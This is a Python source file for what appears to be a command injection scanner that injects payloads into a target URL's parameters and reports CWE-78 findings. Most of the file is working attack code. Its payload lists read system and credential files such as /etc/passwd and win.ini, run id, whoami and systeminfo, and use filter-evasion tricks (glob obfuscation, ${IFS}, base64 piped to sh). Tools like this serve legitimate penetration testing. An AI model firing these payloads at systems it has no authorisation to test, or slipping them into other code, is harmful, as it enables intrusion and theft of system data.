#!/usr/bin/env python3
"""
Command Injection testing module.

Usage:
    python command_injection.py --target https://example.com/ping?host=test --output results/
"""

import argparse
import asyncio
import json
import re
import sys
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

# Add parent to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from core.http_client import AsyncHTTPClient, HTTPResponse
from core.result_manager import ResultManager, ScanResult, Finding, Severity
from core.utils import setup_logging, load_config, normalize_url, extract_domain, timestamp_now, ensure_dir

logger = setup_logging("command_injection")


@dataclass
class CommandInjectionVuln:
    """Represents a discovered command injection vulnerability."""

    url: str
    parameter: str
    method: str
    injection_type: str  # result_based, time_based, blind
    payload: str
    evidence: str
    os_type: str = ""  # linux, windows
    confidence: str = "medium"

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url": self.url,
            "parameter": self.parameter,
            "method": self.method,
            "injection_type": self.injection_type,
            "payload": self.payload,
            "evidence": self.evidence[:500] if self.evidence else "",
            "os_type": self.os_type,
            "confidence": self.confidence,
        }


class CommandInjectionTester:
    """
    Command Injection vulnerability tester.

    Features:
    - Result-based detection
    - Time-based blind detection
    - Multiple OS support (Linux/Windows)
    - Various injection operators
    - Encoding bypass techniques
    """

    # Result-based payloads with expected output patterns
    RESULT_PAYLOADS_LINUX = [
        (";id", r"uid=\d+.*gid=\d+"),
        ("|id", r"uid=\d+.*gid=\d+"),
        ("$(id)", r"uid=\d+.*gid=\d+"),
        ("`id`", r"uid=\d+.*gid=\d+"),
        ("&&id", r"uid=\d+.*gid=\d+"),
        ("||id", r"uid=\d+.*gid=\d+"),
        (";cat /etc/passwd", r"root:.*:0:0"),
        ("|cat /etc/passwd", r"root:.*:0:0"),
        ("$(cat /etc/passwd)", r"root:.*:0:0"),
        (";uname -a", r"Linux"),
        ("|uname -a", r"Linux"),
        (";whoami", r"\w+"),
        ("|whoami", r"\w+"),
        ("$(whoami)", r"\w+"),
        ("`whoami`", r"\w+"),
    ]

    RESULT_PAYLOADS_WINDOWS = [
        ("|whoami", r"\\"),
        ("&whoami", r"\\"),
        ("&&whoami", r"\\"),
        ("||whoami", r"\\"),
        ("|dir", r"<DIR>|Directory"),
        ("&dir", r"<DIR>|Directory"),
        ("|type C:\\Windows\\win.ini", r"\[fonts\]"),
        ("&type C:\\Windows\\win.ini", r"\[fonts\]"),
        ("|systeminfo", r"OS Name"),
    ]

    # Time-based blind payloads
    TIME_PAYLOADS_LINUX = [
        (";sleep {time}", "sleep"),
        ("|sleep {time}", "sleep"),
        ("$(sleep {time})", "sleep"),
        ("`sleep {time}`", "sleep"),
        ("&&sleep {time}", "sleep"),
        ("||sleep {time}", "sleep"),
        (";ping -c {time} 127.0.0.1", "ping"),
    ]

    TIME_PAYLOADS_WINDOWS = [
        ("&ping -n {time} 127.0.0.1", "ping"),
        ("|ping -n {time} 127.0.0.1", "ping"),
        ("&&ping -n {time} 127.0.0.1", "ping"),
        ("&timeout /t {time}", "timeout"),
        ("|timeout /t {time}", "timeout"),
    ]

    # Bypass payloads
    BYPASS_PAYLOADS = [
        # Newline injection
        ("\nid", r"uid=\d+"),
        ("\r\nid", r"uid=\d+"),

        # URL encoding
        ("%0aid", r"uid=\d+"),
        ("%0did", r"uid=\d+"),
        ("%0a%0did", r"uid=\d+"),

        # Quote escaping
        ("';id;'", r"uid=\d+"),
        ('";id;"', r"uid=\d+"),

        # Wildcard/glob
        (";/???/??t /???/p??s??", r"root:"),  # /bin/cat /etc/passwd

        # Variable interpolation
        (";$( id )", r"uid=\d+"),
        (";${IFS}id", r"uid=\d+"),

        # Hex encoding
        (";\\x69\\x64", r"uid=\d+"),  # id

        # Base64
        (";echo aWQ= | base64 -d | sh", r"uid=\d+"),
    ]

    def __init__(
        self,
        target: str,
        output_dir: str = "results",
        config: Optional[Dict] = None,
        proxy: Optional[str] = None,
        timeout: int = 30,
        threads: int = 5,
        time_threshold: float = 5.0,
        test_params: Optional[List[str]] = None,
        methods: Optional[List[str]] = None,
        verbose: bool = False,
    ):
        self.target = normalize_url(target)
        self.target_domain = extract_domain(target)
        self.output_dir = Path(output_dir)
        self.config = config or {}
        self.proxy = proxy
        self.timeout = timeout
        self.threads = threads
        self.time_threshold = time_threshold
        self.test_params = test_params
        self.methods = methods or ["GET"]
        self.verbose = verbose

        self.vulnerabilities: List[CommandInjectionVuln] = []
        self.detected_os: Optional[str] = None

        self.result_manager = ResultManager(output_dir)
        ensure_dir(self.output_dir)

    async def test(self) -> ScanResult:
        """Run command injection tests and return results."""
        result = ScanResult(
            tool="command_injection",
            target=self.target,
            config={
                "timeout": self.timeout,
                "threads": self.threads,
                "time_threshold": self.time_threshold,
                "methods": self.methods,
            },
        )

        logger.info(f"Starting command injection testing for: {self.target}")

        try:
            # Parse URL for parameters
            parsed = urlparse(self.target)
            params = parse_qs(parsed.query)

            if not params and not self.test_params:
                result.add_error("No parameters found. Use --params to specify.")
                logger.warning("No parameters found")
                result.finalize()
                return result

            test_params = self.test_params or list(params.keys())
            logger.info(f"Testing parameters: {test_params}")

            for param in test_params:
                logger.info(f"Testing parameter: {param}")

                # Result-based testing (Linux)
                await self._test_result_based(param, "linux")

                # Result-based testing (Windows)
                await self._test_result_based(param, "windows")

                # Time-based blind testing
                await self._test_time_based(param)

                # Bypass payloads
                await self._test_bypass_payloads(param)

            # Statistics
            result.stats = {
                "parameters_tested": len(test_params),
                "vulnerabilities_found": len(self.vulnerabilities),
                "by_type": self._count_by_type(),
                "os_detected": self.detected_os,
            }

            # Add findings
            for vuln in self.vulnerabilities:
                severity = Severity.CRITICAL  # Command injection is always critical

                result.add_finding(Finding(
                    title=f"Command Injection ({vuln.injection_type}): {vuln.parameter}",
                    severity=severity,
                    description=f"OS command injection allowing arbitrary command execution ({vuln.os_type or 'unknown OS'})",
                    url=vuln.url,
                    parameter=vuln.parameter,
                    payload=vuln.payload,
                    evidence=vuln.evidence,
                    metadata={
                        "injection_type": vuln.injection_type,
                        "os_type": vuln.os_type,
                        "confidence": vuln.confidence,
                    },
                    cwe_id="CWE-78",
                    remediation="Never pass user input to system commands. Use safe APIs and input validation.",
                ))

        except Exception as e:
            result.add_error(f"Testing error: {e}")
            logger.error(f"Testing error: {e}")

        result.finalize()
        return result

    async def _test_result_based(self, param: str, os_type: str):
        """Test for result-based command injection."""
        logger.info(f"Testing result-based injection ({os_type}) for: {param}")

        payloads = self.RESULT_PAYLOADS_LINUX if os_type == "linux" else self.RESULT_PAYLOADS_WINDOWS

        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
            max_retries=1,
        ) as client:
            for payload, pattern in payloads:
                url = self._inject_payload(param, payload)

                try:
                    response = await client.get(url)

                    if re.search(pattern, response.body, re.IGNORECASE):
                        self.detected_os = os_type

                        vuln = CommandInjectionVuln(
                            url=self.target,
                            parameter=param,
                            method="GET",
                            injection_type="result_based",
                            payload=payload,
                            evidence=self._extract_evidence(pattern, response.body),
                            os_type=os_type,
                            confidence="high",
                        )
                        self.vulnerabilities.append(vuln)
                        logger.info(f"Found command injection: {param} ({os_type})")
                        return

                except Exception as e:
                    logger.debug(f"Error testing payload: {e}")

    async def _test_time_based(self, param: str):
        """Test for time-based blind command injection."""
        logger.info(f"Testing time-based injection for: {param}")

        async with AsyncHTTPClient(
            timeout=self.timeout + 10,
            proxy=self.proxy,
            max_retries=1,
        ) as client:
            # Get baseline timing
            start = time.time()
            await client.get(self.target)
            baseline_time = time.time() - start

            sleep_time = int(self.time_threshold)

            # Test Linux payloads
            for payload_template, cmd in self.TIME_PAYLOADS_LINUX:
                payload = payload_template.format(time=sleep_time)
                url = self._inject_payload(param, payload)

                try:
                    start = time.time()
                    await client.get(url)
                    elapsed = time.time() - start

                    if elapsed >= (baseline_time + sleep_time - 1):
                        # Verify
                        start = time.time()
                        await client.get(url)
                        elapsed2 = time.time() - start

                        if elapsed2 >= (baseline_time + sleep_time - 1):
                            vuln = CommandInjectionVuln(
                                url=self.target,
                                parameter=param,
                                method="GET",
                                injection_type="time_based",
                                payload=payload,
                                evidence=f"Response delayed by {elapsed:.2f}s (baseline: {baseline_time:.2f}s)",
                                os_type="linux",
                                confidence="high",
                            )
                            self.vulnerabilities.append(vuln)
                            logger.info(f"Found time-based injection: {param}")
                            return

                except asyncio.TimeoutError:
                    vuln = CommandInjectionVuln(
                        url=self.target,
                        parameter=param,
                        method="GET",
                        injection_type="time_based",
                        payload=payload,
                        evidence=f"Request timed out (expected for sleep {sleep_time}s)",
                        os_type="linux",
                        confidence="medium",
                    )
                    self.vulnerabilities.append(vuln)
                    logger.info(f"Potential time-based injection (timeout): {param}")
                    return

                except Exception as e:
                    logger.debug(f"Error testing time payload: {e}")

            # Test Windows payloads
            for payload_template, cmd in self.TIME_PAYLOADS_WINDOWS:
                payload = payload_template.format(time=sleep_time)
                url = self._inject_payload(param, payload)

                try:
                    start = time.time()
                    await client.get(url)
                    elapsed = time.time() - start

                    if elapsed >= (baseline_time + sleep_time - 1):
                        vuln = CommandInjectionVuln(
                            url=self.target,
                            parameter=param,
                            method="GET",
                            injection_type="time_based",
                            payload=payload,
                            evidence=f"Response delayed by {elapsed:.2f}s",
                            os_type="windows",
                            confidence="medium",
                        )
                        self.vulnerabilities.append(vuln)
                        logger.info(f"Found time-based injection (Windows): {param}")
                        return

                except Exception as e:
                    logger.debug(f"Error testing Windows time payload: {e}")

    async def _test_bypass_payloads(self, param: str):
        """Test with bypass/evasion payloads."""
        logger.info(f"Testing bypass payloads for: {param}")

        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
            max_retries=1,
        ) as client:
            for payload, pattern in self.BYPASS_PAYLOADS:
                url = self._inject_payload(param, payload)

                try:
                    response = await client.get(url)

                    if re.search(pattern, response.body, re.IGNORECASE):
                        vuln = CommandInjectionVuln(
                            url=self.target,
                            parameter=param,
                            method="GET",
                            injection_type="bypass",
                            payload=payload,
                            evidence=self._extract_evidence(pattern, response.body),
                            os_type="linux",
                            confidence="high",
                        )
                        self.vulnerabilities.append(vuln)
                        logger.info(f"Found injection with bypass: {param}")
                        return

                except Exception as e:
                    logger.debug(f"Error testing bypass payload: {e}")

    def _inject_payload(self, param: str, payload: str) -> str:
        """Inject payload into parameter."""
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)

        if param in params:
            original = params[param][0]
            params[param] = [original + payload]
        else:
            params[param] = [payload]

        new_query = urlencode(params, doseq=True)
        return urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))

    def _extract_evidence(self, pattern: str, body: str) -> str:
        """Extract evidence from response."""
        match = re.search(pattern, body, re.IGNORECASE)
        if match:
            start = max(0, match.start() - 20)
            end = min(len(body), match.end() + 20)
            return body[start:end]
        return "Command output detected in response"

    def _count_by_type(self) -> Dict[str, int]:
        """Count vulnerabilities by type."""
        counts: Dict[str, int] = {}
        for vuln in self.vulnerabilities:
            counts[vuln.injection_type] = counts.get(vuln.injection_type, 0) + 1
        return counts

    def save_results(self, result: ScanResult) -> Dict[str, str]:
        """Save results to files."""
        paths = self.result_manager.save(result, f"cmdi_{self.target_domain}")

        vuln_path = self.output_dir / f"cmdi_vulns_{self.target_domain}.json"
        with open(vuln_path, "w") as f:
            json.dump(
                {
                    "target": self.target,
                    "timestamp": timestamp_now(),
                    "vulnerabilities": [v.to_dict() for v in self.vulnerabilities],
                },
                f,
                indent=2,
            )
        paths["vulnerabilities"] = str(vuln_path)

        return paths


async def main():
    parser = argparse.ArgumentParser(
        description="Command Injection vulnerability tester"
    )
    parser.add_argument("-t", "--target", required=True, help="Target URL with parameters")
    parser.add_argument("-o", "--output", default="results", help="Output directory")
    parser.add_argument("-c", "--config", help="Config file path")
    parser.add_argument("-p", "--proxy", help="Proxy URL")
    parser.add_argument("--threads", type=int, default=5, help="Concurrent threads")
    parser.add_argument("--timeout", type=int, default=30, help="Request timeout")
    parser.add_argument("--time-threshold", type=float, default=5.0, help="Time-based threshold")
    parser.add_argument("--params", help="Parameters to test (comma-separated)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

    args = parser.parse_args()

    config = {}
    if args.config:
        config = load_config(args.config)

    test_params = args.params.split(",") if args.params else None

    tester = CommandInjectionTester(
        target=args.target,
        output_dir=args.output,
        config=config,
        proxy=args.proxy,
        timeout=args.timeout,
        threads=args.threads,
        time_threshold=args.time_threshold,
        test_params=test_params,
        verbose=args.verbose,
    )

    result = await tester.test()
    paths = tester.save_results(result)

    print(f"\n{'='*60}")
    print(f"Command Injection Testing Complete: {args.target}")
    print(f"{'='*60}")
    print(f"Vulnerabilities Found: {len(tester.vulnerabilities)}")
    print(f"OS Detected: {tester.detected_os or 'Unknown'}")
    print(f"\nResults saved to:")
    for name, path in paths.items():
        print(f"  {name}: {path}")

    if tester.vulnerabilities:
        print(f"\n*** CRITICAL: COMMAND INJECTION FOUND ***")
        for vuln in tester.vulnerabilities:
            print(f"  [{vuln.confidence.upper()}] {vuln.injection_type}: {vuln.parameter} ({vuln.os_type})")


if __name__ == "__main__":
    asyncio.run(main())
